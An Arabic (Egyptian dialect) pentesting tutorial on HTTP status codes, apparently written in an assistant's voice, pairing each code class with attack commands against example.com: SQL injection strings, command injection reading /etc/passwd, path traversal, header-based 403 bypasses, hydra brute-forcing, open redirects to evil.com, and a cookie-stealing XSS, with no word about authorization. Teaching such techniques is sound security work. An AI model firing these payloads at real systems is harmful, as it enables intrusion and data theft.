تمام، هنشرح **رموز الحالة (Status Codes) ومعانيها** بنفس الطريقة السابقة: شرح مفصل وعملي مع أكواد وأوامر، مع تركيز على اختبار الاختراق (Pentesting)، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال.

---

### **1. شرح رموز الحالة (Status Codes) ومعانيها بالتفصيل:**

#### **أ. المفهوم الأساسي (What Are Status Codes):**
- رموز الحالة هي أرقام بيبعتها السيرفر مع الرد عشان يقولك حالة طلبك إيه. بتيجي في أول سطر في الرد (مثل `HTTP/1.1 200 OK`).
- مقسمة لـ 5 فئات:
  - **1xx:** معلومات (نادرة).
  - **2xx:** نجاح.
  - **3xx:** إعادة توجيه.
  - **4xx:** خطأ من العميل.
  - **5xx:** خطأ في السيرفر.

- **مثال عملي:**
  - `curl -I http://example.com` (يجيبلك الرؤوس مع الكود):
    - `HTTP/1.1 200 OK` (كل حاجة تمام).

- **جانب عملي للبينتست:**
  - جرب تشوف الكود:
    - `curl -I http://example.com/nonexistent` (غالبًا 404).
  - استخدم `wget`:
    - `wget --spider http://example.com` (يظهر الكود بدون تحميل).

- **خلاصة بالعامية:**
  - "الكود ده زي الرسالة من السيرفر: لو 200 يبقى فرحان، لو 500 يبقى متبهدل، ولو 404 يبقى ضايع."

---

#### **ب. الفئات والرموز الشائعة (Categories & Common Codes):**

1. **1xx (Informational):**
   - نادرة، بتقول إن الطلب لسه بيتعالج.
   - **100 Continue:** "كمّل ابعت البيانات".
   - عملي: مش شائعة جدًا، بس ممكن تشوفها في طلبات كبيرة.

2. **2xx (Success):**
   - **200 OK:** الطلب نجح والبيانات رجعت.
     - `curl http://example.com` (رد 200 مع الصفحة).
   - **201 Created:** تم إنشاء حاجة جديدة (زي بعد POST).
     - `curl -X POST -d "name=test" http://example.com/users`.

3. **3xx (Redirection):**
   - **301 Moved Permanently:** المورد انتقل لمكان جديد.
     - `curl -I http://example.com/old` (يظهر Location جديد).
   - **302 Found:** إعادة توجيه مؤقت.
     - `curl -L http://example.com/temp` (يتبع التوجيه).

4. **4xx (Client Error):**
   - **400 Bad Request:** الطلب غلط (صيغة مش صح).
     - `curl http://example.com/?id=abc!@#` (400 لو مش متوقع).
   - **403 Forbidden:** ممنوع الوصول.
     - `curl http://example.com/admin`.
   - **404 Not Found:** المسار مش موجود.
     - `curl http://example.com/xyz`.

5. **5xx (Server Error):**
   - **500 Internal Server Error:** مشكلة داخلية في السيرفر.
     - `curl http://example.com/?id=1;ls` (لو بيطلع خطأ).
   - **503 Service Unavailable:** السيرفر مشغول أو متعطل.
     - `curl http://example.com` (لو تحت ضغط).

- **جانب عملي للبينتست:**
  - 200: جرب تحقن: `curl http://example.com/search?q=test' OR '1'='1` (لو رجع 200 مع بيانات زيادة).
  - 403: جرب تجاوز: `curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/admin`.
  - 404: ابحث عن مسارات مخفية: `dirb http://example.com /wordlist.txt`.
  - 500: كرر الهجوم: `curl http://example.com/?id=1;cat /etc/passwd` (استغلال خطأ).

- **خلاصة بالعامية:**
  - "كل رقم ليه حكاية: 200 يعني فل، 403 يعني ممنوع، 500 يعني السيرفر بيصرخ، استغل الكود اللي ينفعك."

---

#### **ج. معاني إضافية واستخدامات (Additional Meanings):**
- **200 قد تكون خدعة:** لو رجع بيانات مش متوقعة (زي SQLi ناجح).
- **403/401:** فرق بسيط:
  - 403: ممنوع حتى لو عندك تصريح.
  - 401 Unauthorized: محتاج تسجل دخول.
- **500:** غالبًا بيكشف مشكلة في الكود (فرصة ذهبية).

- **مثال عملي:**
  - 401: `curl http://example.com/api` (يطلب Auth).
  - 403: `curl -u "admin:wrongpass" http://example.com/admin`.

- **جانب عملي للبينتست:**
  - 401: جرب كلمات سر ضعيفة: `hydra -l admin -P /wordlist.txt http://example.com -M http-get`.
  - 403: جرب تغير المسار: `curl http://example.com/Admin` (Case Sensitivity).
  - 500: حقن أوامر: `curl http://example.com/?cmd=whoami`.

- **خلاصة بالعامية:**
  - "الكود مش مجرد رقم، ده دليلك: لو 403 ابحث عن مفتاح، لو 500 العب في الجرح، كل حاجة ليها معنى."

---

#### **د. الأمن والثغرات (Security & Vulnerabilities):**
- **2xx:** ممكن يكشف بيانات حساسة لو السيرفر مش محمي.
- **3xx:** إعادة توجيه مفتوحة (Open Redirect).
- **4xx:** سوء تهيئة (مثل 403 بدل 404) بيكشف مسارات.
- **5xx:** أخطاء بتظهر تفاصيل داخلية (Stack Traces).

- **مثال عملي:**
  - 302: `curl http://example.com/redirect?url=http://evil.com` (Open Redirect).
  - 500: `curl http://example.com/?id=1' DROP TABLE users --` (SQL Error).

- **جانب عملي للبينتست:**
  - 2xx: جرب استخراج بيانات: `curl http://example.com/api/users/1 UNION SELECT 1,2,3--`.
  - 3xx: حقن رابط خبيث: `curl http://example.com/redirect?url=javascript:alert(1)`.
  - 4xx: فحص مسارات: `gobuster dir -u http://example.com -w /wordlist.txt`.
  - 5xx: استغلال الأخطاء: `curl http://example.com/?file=../../etc/passwd`.

- **خلاصة بالعامية:**
  - "الكود لو اتقرا صح هيوريك الثغرة على طبق: 500 يعني فوضى، 403 يعني فيه حاجة مخبية، العب على الحتة الضعيفة."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اكتشف الردود:**
   - `curl -I http://example.com` (شوف الكود الأساسي).
   - `nmap -p 80 --script http-enum example.com` (كشف مسارات).

2. **اختبر 2xx:**
   - `curl http://example.com/search?q=test' OR '1'='1` (SQLi).
   - `curl http://example.com/api/users/1` (بيانات حساسة).

3. **استغل 3xx:**
   - `curl http://example.com/redirect?url=http://attacker.com` (Open Redirect).
   - جرب XSS: `curl http://example.com/redirect?url=javascript:alert(document.cookie)`.

4. **هاجم 4xx:**
   - 403: `curl -H "Referer: http://example.com" http://example.com/admin`.
   - 404: `ffuf -u http://example.com/FUZZ -w /wordlist.txt`.

5. **اضرب 5xx:**
   - `curl http://example.com/?id=1;ls` (Command Injection).
   - `sqlmap -u http://example.com/?id=1 --dbs` (SQLi لو ظهر 500).

---

### **خلاصة نهائية بالعامية:**
- "رموز الحالة دي زي إشارات المرور، لو فهمتها هتعرف تمشي فين وتضرب فين، 500 يعني افتح الباب، 403 يعني دور على الشباك، خلّيك شاطر!"